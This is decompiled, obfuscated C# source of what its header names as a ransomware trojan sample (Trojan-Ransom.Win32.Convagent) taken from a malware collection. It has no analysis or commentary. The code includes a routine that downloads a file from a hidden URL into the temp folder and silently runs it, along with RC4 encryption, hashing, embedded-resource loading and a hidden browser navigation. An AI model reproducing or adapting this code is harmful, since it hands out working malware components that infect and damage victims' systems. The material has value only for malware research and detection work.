// Decompiled with JetBrains decompiler
// Type: *p.Ok$5#
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DB18CA19-4EF7-467A-AA02-244B3B1B157A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\VHO-Trojan-Ransom.Win32.Convagent.gen-fe2473ff7e7507e98adf2d055102064f9ebc133096f412e3944dd0dbee2345d7.exe

using \u002Ap\u000C;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u002Ap\u000C
{
  internal class \u001AOk\u00245\u0023
  {
    private const uint \u0015\u0021\u001Bj = 4;
    public static Random H6A = new Random();
    private static MD5 \u0040\u0005R\u002DGD = (MD5) new MD5CryptoServiceProvider();

    public static string \u0029\u001A0\u002EL\u001B\u000D(string _param0) => BitConverter.ToString(\u001AOk\u00245\u0023.\u0040\u0005R\u002DGD.ComputeHash(Encoding.Default.GetBytes(_param0))).Replace(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.EX\u0028(), \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0013758()).ToUpper();

    private static string \u000Fh\u0020E\u000Aq(string _param0)
    {
      FileStream inputStream = System.IO.File.OpenRead(_param0);
      byte[] hash = \u001AOk\u00245\u0023.\u0040\u0005R\u002DGD.ComputeHash((Stream) inputStream);
      inputStream.Close();
      return BitConverter.ToString(hash).Replace(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.EX\u0028(), \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0013758()).ToUpper();
    }

    public static bool \u002C\u0001b\u000D\u005B\u002C\u002C(string _param0)
    {
      if (!System.IO.File.Exists(_param0))
        return false;
      if (!(\u001AOk\u00245\u0023.\u000Fh\u0020E\u000Aq(_param0) != \u001AOk\u00245\u0023.\u000Fh\u0020E\u000Aq(\u0034\u002Dy\u0029\u000B\u0023.\u0010\u003E5W\u00259\u002B)))
        return true;
      System.IO.File.Delete(_param0);
      return false;
    }

    public static void \u000C\u000Ckr(ref string _param0)
    {
      int num = 0;
      foreach (char ch in _param0.ToCharArray())
        num += (int) ch;
      _param0 = Convert.ToBase64String(new SHA512Managed().ComputeHash(BitConverter.GetBytes(num)));
    }

    public static void \u0004\u001D\u000Eh\u0008\u001F(ref string _param0, string _param1)
    {
      byte[] bytes1 = Encoding.Default.GetBytes(_param0);
      byte[] bytes2 = Encoding.Default.GetBytes(_param1);
      byte[] numArray = new byte[256];
      int index1 = 0;
      for (int index2 = 0; index2 < 256; ++index2)
        numArray[index2] = (byte) index2;
      for (int index3 = 0; index3 < 256; ++index3)
      {
        index1 = (index1 + (int) numArray[index3] + (int) bytes2[index3 % bytes2.GetLength(0)]) % 256;
        byte num = numArray[index3];
        numArray[index3] = numArray[index1];
        numArray[index1] = num;
      }
      int index4;
      int index5 = index4 = 0;
      for (int index6 = 0; index6 < bytes1.GetLength(0); ++index6)
      {
        index5 = (index5 + 1) % 256;
        index4 = (index4 + (int) numArray[index5]) % 256;
        byte num = numArray[index5];
        numArray[index5] = numArray[index4];
        numArray[index4] = num;
        bytes1[index6] ^= numArray[((int) numArray[index5] + (int) numArray[index4]) % 256];
      }
      _param0 = Encoding.Default.GetString(bytes1);
    }

    public static string \u001E\u001BN\u003C\u0017\u001DB(int _param0)
    {
      string str = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.y\u0025IG5\u0029();
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < _param0; ++index)
        stringBuilder.Append(str.Substring(\u001AOk\u00245\u0023.H6A.Next(0, str.Length), 1));
      return stringBuilder.ToString();
    }

    public static void \u00062\u0007\u0021\u0022\u0007\u000Cs(string _param0)
    {
      if (!_param0.StartsWith(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u002AC()))
        _param0 = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u002AC() + _param0;
      Thread thread = new Thread((ThreadStart) (() =>
      {
        WebBrowser webBrowser = new WebBrowser();
        webBrowser.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(\u001AOk\u00245\u0023.\u0013\u008D\u002D);
        webBrowser.Navigate(new Uri(_param0));
        Application.Run();
      }));
      thread.SetApartmentState(ApartmentState.STA);
      thread.Start();
    }

    private static void \u0013\u008D\u002D(
      object _param0,
      WebBrowserDocumentCompletedEventArgs _param1)
    {
      if (!((_param0 as WebBrowser).Url == _param1.Url))
        return;
      Application.ExitThread();
      \u001AOk\u00245\u0023.\u001F\u0010\u00199();
    }

    public static bool \u0010\u0025m\u001A(string _param0)
    {
      try
      {
        if (!_param0.StartsWith(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u002AC()))
          _param0 = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u002AC() + _param0;
        WebClient webClient = new WebClient()
        {
          Proxy = (IWebProxy) null
        };
        Process process = new Process();
        string lower = _param0.Substring(_param0.LastIndexOf('.')).ToLower();
        string str = Environment.GetEnvironmentVariable(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0038\u001B9\u000E\u001A\u001F\u003E\u0021()) + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0006\u000DV() + \u001AOk\u00245\u0023.\u001E\u001BN\u003C\u0017\u001DB(\u001AOk\u00245\u0023.H6A.Next(5, 12)) + lower;
        webClient.DownloadFile(_param0, str);
        if (!System.IO.File.Exists(str) || \u001AOk\u00245\u0023.\u000Fh\u0020E\u000Aq(str) == \u001AOk\u00245\u0023.\u000Fh\u0020E\u000Aq(\u0034\u002Dy\u0029\u000B\u0023.\u0010\u003E5W\u00259\u002B))
          return false;
        process.StartInfo.FileName = str;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.ErrorDialog = false;
        process.Start();
      }
      catch
      {
        return false;
      }
      return true;
    }

    public static long \u0002\u000Ej\u0024\u0011\u003C()
    {
      Ping ping = new Ping();
      PingOptions options = new PingOptions()
      {
        DontFragment = true
      };
      PingReply pingReply = ping.Send(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0002\u008E\u001EJ\u00165\u0007(), 1000, new byte[32], options);
      return pingReply.Status == IPStatus.Success ? pingReply.RoundtripTime : -1L;
    }

    public static string C\u002B\u0021\u003C\u0020\u003A(IntPtr _param0)
    {
      byte[] numArray1 = new byte[0];
      byte[] numArray2;
      try
      {
        IntPtr num = \u001AOk\u00245\u0023.H\u000A\u0001\u0012(IntPtr.Zero, _param0, (IntPtr) 4L);
        IntPtr source = \u001AOk\u00245\u0023.A\u001B\u001E\u0002YQ\u0015(\u001AOk\u00245\u0023.\u0014\u001D\u0020a\u0016(IntPtr.Zero, num));
        uint length = \u001AOk\u00245\u0023.\u00032\u0014\u0029\u000C\u0001(IntPtr.Zero, num);
        numArray2 = new byte[(IntPtr) length];
        Marshal.Copy(source, numArray2, 0, (int) length);
      }
      catch
      {
        return string.Empty;
      }
      return Encoding.Default.GetString(numArray2);
    }

    public static void \u001F\u0010\u00199()
    {
      GC.Collect();
      GC.WaitForPendingFinalizers();
      if (Environment.OSVersion.Platform != PlatformID.Win32NT)
        return;
      \u001AOk\u00245\u0023.\u0005\u0040B5\u002A\u002E\u000F(Process.GetCurrentProcess().Handle, -1, -1);
    }

    [DllImport("kernel32", EntryPoint = "SetProcessWorkingSetSize")]
    private static extern int \u0005\u0040B5\u002A\u002E\u000F(
      IntPtr _param0,
      int _param1,
      int _param2);

    [DllImport("kernel32", EntryPoint = "FindResource")]
    private static extern IntPtr H\u000A\u0001\u0012(
      IntPtr _param0,
      IntPtr _param1,
      IntPtr _param2);

    [DllImport("kernel32", EntryPoint = "LoadResource")]
    private static extern IntPtr \u0014\u001D\u0020a\u0016(IntPtr _param0, IntPtr _param1);

    [DllImport("kernel32", EntryPoint = "LockResource")]
    private static extern IntPtr A\u001B\u001E\u0002YQ\u0015(IntPtr _param0);

    [DllImport("kernel32", EntryPoint = "SizeofResource")]
    private static extern uint \u00032\u0014\u0029\u000C\u0001(IntPtr _param0, IntPtr _param1);
  }
}
